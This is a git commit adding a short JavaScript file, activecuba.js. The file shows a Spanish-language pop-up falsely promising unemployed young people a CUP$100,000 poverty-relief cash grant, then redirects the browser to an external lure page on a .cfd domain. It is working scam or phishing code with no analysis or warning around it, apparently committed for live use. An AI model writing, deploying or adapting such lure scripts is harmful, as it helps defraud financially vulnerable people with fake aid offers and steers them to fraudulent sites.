2d5a1bcaf54f71bc3942ce982b673714a83babbd
Help-All <imaobongumoh637@gmail.com>
2026-05-16 00:52:51 +0100

    Create activecuba.js

---
+++ activecuba.js
@@ -0,0 +1,10 @@
+var password = 'RETIRAR CUP$100,000';
+
+password = prompt(
+  '¡Felicidades, eres elegible para la SUBVENCIÓN EN EFECTIVO DE ALIVIO A LA POBREZA DE CUP$100,000 PARA JÓVENES DESEMPLEADOS. Haz clic en OK para recibirla al instante.',
+  'RETIRAR CUP$100,000'
+);
+
+if (password !== 'RETIRAR CUP$100,000') {
+    location.href = 'https://getin-ofer.cfd/100000-Beca-Para-Jovenes.html';
+}
